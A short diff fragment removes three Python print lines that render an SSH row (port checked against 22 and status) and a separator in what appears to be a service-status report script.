-    print(f" 8  | {'SSH':<8} | {format_port_checked(service_ports.get('ssh'), 22, services_ok.get('ssh')):<5} | {format_status(services_ok.get('ssh'))}")
-    print(f"{'-'*40}")
-    print("\n")
